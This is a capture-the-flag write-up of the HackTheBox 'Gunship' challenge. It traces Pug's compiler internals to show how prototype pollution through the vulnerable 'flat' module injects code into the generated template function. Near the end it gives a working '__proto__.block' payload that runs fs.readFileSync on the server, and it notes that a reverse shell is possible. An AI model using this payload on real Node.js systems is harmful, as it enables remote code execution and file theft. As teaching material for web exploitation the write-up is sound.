# Gunship

The original link to this challenge is here: https://app.hackthebox.com/challenges/gunship

This repository will provide the files just in case the challenge is taken down from HTB. Also, please note that [I referred to this blog post about AST Injection](https://blog.p6.is/AST-Injection/) but it took me a few days to understand everything that is mentioned in that blog post. I decided to study prototype pollution and trace all the code in this challenge by myself instead of just reading that blogpost and following those instructions.

This challenge is about exploiting Prototype Pollution and trying to modify the template function created by the template engine. The template engine used with this challenge is [Pug](https://pugjs.org/api/getting-started.html).

`pug.compile()` method takes the pug's source code as input parameter (which might look something like this "*p #{name}'s Pug source code!*") and returns a function. This function can then be called to get the HTML.

Example from Pug's website looks like this: 

```javascript
// Compile the source code
const compiledFunction = pug.compile("p #{name}'s Pug source code!");

// Execute the compiledFunction() to get the HTML
console.log(compiledFunction({name: 'Timothy'}));
// "<p>Timothy's Pug source code!</p>"
```

So, for this challenge, we need to somehow inject our own "payload" into that *compiledFunction()* so that it is executed when that function is called.

Let's download and walkthrough the challenge.

The challenge originally runs in Docker but we can simply extract the zip file, run `npm install` in the `challenge/` directory and run `npm start` to start this challenge on the host machine instead of Docker so that we can attach a debugger to this application and add breakpoints and stuff.

Open http://localhost:1337 and insert the artist name as "Haigh" so that we get into the if condition. [in `challenge/routes/index.js` file]

```javascript
if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
	return  res.json({
	'response':  pug.compile('span Hello #{user}, thank you for letting us know!')({ user:  'guest' })
	});
}
```

Now, let's start dissecting the code and let's dig it deep to find a way to exploit prototype pollution! Remember that you won't be told that this challenge is about Prototype Pollution. You'll have to research and tinker around a bit to figure that out! The prototype pollution vulnerability was originally in the `flat` nodejs module used in this challenge and [it's now been fixed](https://github.com/hughsk/flat/commit/20ef0ef55dfa028caddaedbcb33efbdb04d18e13). This challenge uses the vulnerable version of `flat` so that we can learn about the prototype pollution that existed earlier!

Also, you might want to research a bit about some of the code compilation processes like what lexer is, a parser, what is code generation etc before diving into this challenge as it will greatly help understand the code. Maybe just going through [this page](https://www.tutorialspoint.com/compiler_design/compiler_design_phases_of_compiler.htm) would be sufficient!

As pug is also sort of like a compiler, so knowing how compilers work would be very helpful to trace the code of Pug.

Below are the rough notes that I made while tracing through the code to find prototype pollution:

I started making these notes while stepping into the code using the debugger.

    notes.txt:

```
pug.compile()

compileBody [in node_modules/pub/lib/index.js] : Compile the given `str` of pug and return a function body.

load.string(str, options) [node_modules/pug-load/index.js]: an operating point for lexer and parser. From here, we call both lexer and parser.

new Lexer(str, options) [node_modules/pug-lexer/index.js]: returns tokens.
getTokens()
	callLexerFunction('advance')
	advance() -> this function calls many different smaller functions like blank(), eos(), endInterpolation(), ...., block()
By the end of getTokens() method, we'll have the following tokens in the lexer:

[
  {
    type: "tag",
    loc: {
      start: {
        line: 1,
        column: 1,
      },
      filename: undefined,
      end: {
        line: 1,
        column: 5,
      },
    },
    val: "span",
  },
  {
    type: "text",
    loc: {
      start: {
        line: 1,
        column: 6,
      },
      filename: undefined,
      end: {
        line: 1,
        column: 12,
      },
    },
    val: "Hello ",
  },
  {
    type: "interpolated-code",
    loc: {
      start: {
        line: 1,
        column: 12,
      },
      filename: undefined,
      end: {
        line: 1,
        column: 19,
      },
    },
    mustEscape: true,
    buffer: true,
    val: "user",
  },
  {
    type: "text",
    loc: {
      start: {
        line: 1,
        column: 19,
      },
      filename: undefined,
      end: {
        line: 1,
        column: 51,
      },
    },
    val: ", thank you for letting us know!",
  },
  {
    type: "eos",
    loc: {
      start: {
        line: 1,
        column: 51,
      },
      filename: undefined,
      end: {
        line: 1,
        column: 51,
      },
    },
  },
]


next, we'll come back to load.string from where we had called the lexer. Now we'll pass the above tokens to parser.

parser = new Parser(tokens, options)

parser.parse()
step 1: creates an empty Block
{
  type: "Block",
  nodes: [
  ],
  line: 0,
  filename: undefined,
}

After parser completes, the Abstract Syntax Tree (AST) looks like this:
{
  type: "Block",
  nodes: [
    {
      type: "Tag",
      name: "span",
      selfClosing: false,
      block: {
        type: "Block",
        nodes: [
          {
            type: "Text",
            val: "Hello ",
            line: 1,
            column: 6,
            filename: undefined,
          },
          {
            type: "Code",
            val: "user",
            buffer: true,
            mustEscape: true,
            isInline: true,
            line: 1,
            column: 12,
            filename: undefined,
          },
          {
            type: "Text",
            val: ", thank you for letting us know!",
            line: 1,
            column: 19,
            filename: undefined,
          },
        ],
        line: 1,
        filename: undefined,
      },
      attrs: [
      ],
      attributeBlocks: [
      ],
      isInline: true,
      line: 1,
      column: 1,
      filename: undefined,
    },
  ],
  line: 0,
  filename: undefined,
}

After the AST is created, Pug "walks" through the AST to see if any transformation is need.

we'll call walk(ast, function()) function from the pug-load module. Again, pug-load is like the center point of all the important processes happening in pug library.

calling walk() will take us to pug-walk module.

walkAST(ast, before, after, options) [node_modules/pug-walk/index.js]

Here, 

before = function() {
	...
	...
}

'after' will be undefined.
and 'options' will be undefined as well.

There is a switch case in walkAST() which is very important.

switch (ast.type) {
    case 'NamedBlock':
    case 'Block':
      ast.nodes = walkAndMergeNodes(ast.nodes);
      break;
    case 'Case':
    case 'Filter':
    case 'Mixin':
    case 'Tag':
    case 'InterpolatedTag':
    case 'When':
    case 'Code':
    case 'While':
      if (ast.block) {
        ast.block = walkAST(ast.block, before, after, options);
      }
      break;
    ....
    ....
    ....
    ....
    default:
      throw new Error('Unexpected node type ' + ast.type);
      break;
  }

This walkAST() function will be called recursively.

In the first recursive call, the ast.type will be 'Block'.
2nd call, ast.type will be 'Tag'. During this call, ast.block exists.
3rd call, ast.type will be 'Block' again, during this call, 
4th call, ast.type will be 'Code'. During this call, ast.block doesn't exists!
But in the switch case, we are checking if it exists. Here we can do a prototype pollution by using "Object.prototype.block"!

We can do: Object.prototype.block = {"type":"Text","val":"console.log('this has been executed!!!!!')"};

And that will be added to the AST!

After the walkAST() is complete, the resulting AST will look like this!

{
  type: "Block",
  nodes: [
    {
      type: "Tag",
      name: "span",
      selfClosing: false,
      block: {
        type: "Block",
        nodes: [
          {
            type: "Text",
            val: "Hello ",
            line: 1,
            column: 6,
          },
          {
            type: "Code",
            val: "user",
            buffer: true,
            mustEscape: true,
            isInline: true,
            line: 1,
            column: 12,
            block: {
              type: "Text",
              val: "console.log('this has been executed!!!!!')",
            },
          },
          {
            type: "Text",
            val: ", thank you for letting us know!",
            line: 1,
            column: 19,
          },
        ],
        line: 1,
      },
      attrs: [
      ],
      attributeBlocks: [
      ],
      isInline: true,
      line: 1,
      column: 1,
    },
  ],
  line: 0,
}

More specifically, check out this part of that JSON:
{
  type: "Code",
  val: "user",
  buffer: true,
  mustEscape: true,
  isInline: true,
  line: 1,
  column: 12,
  block: {
    type: "Text",
    val: "console.log('this has been executed!!!!!')",
  },
}

Lastly, this AST is passed through the Code Generator to get the JavaScript code for our template function.

generateCode(ast, options) [node_modules/pug-code-gen/index.js]
new Compiler(ast, options).compile();

But in the template function, "console.log('this has been executed!!!!!')" will be added as a string and won't be executed.

That is, the resulting template function code looks like this:

function template(locals) {var pug_html = "", pug_mixins = {}, pug_interp;var pug_debug_filename, pug_debug_line;try {;
    var locals_for_with = (locals || {});
    
    (function (user) {
      ;pug_debug_line = 1;
pug_html = pug_html + "\u003Cspan\u003E";
;pug_debug_line = 1;
pug_html = pug_html + "Hello ";
;pug_debug_line = 1;
pug_html = pug_html + (pug.escape(null == (pug_interp = user) ? "" : pug_interp)) + "console.log('this has been executed!!!!!')";
;pug_debug_line = 1;
pug_html = pug_html + ", thank you for letting us know!\u003C\u002Fspan\u003E";
    }.call(this, "user" in locals_for_with ?
        locals_for_with.user :
        typeof user !== 'undefined' ? user : undefined));
    ;} catch (err) {pug.rethrow(err, pug_debug_filename, pug_debug_line);};return pug_html;}
    
Notice that 'console.log('this has been executed!!!!!')' is taken as a string and won't be executed. We need to attack the part of the code that can be potentially executed.

One more Prototype Pollution payload similar to 'Object.prototype.block' is 'Object.prototype.filename' (Refer line number 316 of index.js file in pug-code-gen module to know why this pollution works). Assigning any value to 'Object.prototype.filename' will also show up in the template function code but again, it will be in the form of a string and won't be executed.

We need to target the 'pug_debug_line = 1'. If we replace that value '1' with some of our code, then that will be executed.

How do we do that? By the following payload:
Object.prototype.block = {"type": "Text", "line": "console.log('hello there!')"};

The above line will appear in the 'Code' block of the AST again but check out the function:
visitCode: function(code): more specifically, the line number 786 of index.js file in pug-code-gen module.
We are checking the following condition
if (code.block) {
	...
	this.visit(code.block, code);
	...
}

That visit() method will visit a node in the AST and converts that to JavaScript code that will be added in the template function.
After our pollution payload, the 'Code' block of the AST will be like this:

{
  type: "Block",
  nodes: [
    {
      type: "Tag",
      name: "span",
      selfClosing: false,
      block: {
        type: "Block",
        nodes: [
          {
            type: "Text",
            val: "Hello ",
            line: 1,
            column: 6,
          },
          {
            type: "Code",
            val: "user",
            buffer: true,
            mustEscape: true,
            isInline: true,
            line: 1,
            column: 12,
            block: {
              type: "Text",
              line: "console.log('hello there!')",
            },
          },
          {
            type: "Text",
            val: ", thank you for letting us know!",
            line: 1,
            column: 19,
          },
        ],
        line: 1,
      },
      attrs: [
      ],
      attributeBlocks: [
      ],
      isInline: true,
      line: 1,
      column: 1,
    },
  ],
  line: 0,
}

As we're passing the code.block to visit(), the code.block value will be:
{
	type: "Text",
	line: "console.log('hello there!')",
} 

In the visit(node) method, we have the following:
if (debug && node.debug !== false && node.type !== 'Block') {
      if (node.line) {
        var js = ';pug_debug_line = ' + node.line;
        if (node.filename)
          js += ';pug_debug_filename = ' + stringify(node.filename);
        this.buf.push(js + ';');
      }
}

That node.line will our payload. That ";pug_debug_line = ' + node.line" line will result in ";pug_debug_line = ' + console.log('hello there!')"

And our output template function code will look like this:

function template(locals) {var pug_html = "", pug_mixins = {}, pug_interp;var pug_debug_filename, pug_debug_line;try {;
    var locals_for_with = (locals || {});
    
    (function (console, user) {
      ;pug_debug_line = 1;
pug_html = pug_html + "\u003Cspan\u003E";
;pug_debug_line = 1;
pug_html = pug_html + "Hello ";
;pug_debug_line = 1;
pug_html = pug_html + (pug.escape(null == (pug_interp = user) ? "" : pug_interp));
;pug_debug_line = console.log('hello there!');
pug_html = pug_html + "ndefine";
;pug_debug_line = 1;
pug_html = pug_html + ", thank you for letting us know!\u003C\u002Fspan\u003E";
    }.call(this, "console" in locals_for_with ?
        locals_for_with.console :
        typeof console !== 'undefined' ? console : undefined, "user" in locals_for_with ?
        locals_for_with.user :
        typeof user !== 'undefined' ? user : undefined));
    ;} catch (err) {pug.rethrow(err, pug_debug_filename, pug_debug_line);};return pug_html;}
    
    
    
And there we go! We have our inject console.log line there and it will be executed whenever this template function is called. We can put our RCE payload there and get a reverse shell in node.js applications!

Here we'll try to directly read the flag using the following:

global.process.mainModule.require('fs').readFileSync('flag', 'utf8');

The complete payload looks like this:

Object.prototype.block = {"type": "Text", "line": "1; pug_html = pug_html + '[[flag ='+ global.process.mainModule.require('fs').readFileSync('flag', 'utf8')+']]'"};

Or, if you're sending the payload from a script in the form of JSON, then the payload should be:

 "__proto__.block": {
        "type": "Text", 
        "line": "1; pug_html = pug_html + '[[flag ='+ global.process.mainModule.require('fs').readFileSync('flag', 'utf8')+']]'"
    }


And you can get the flag in the UI!

```



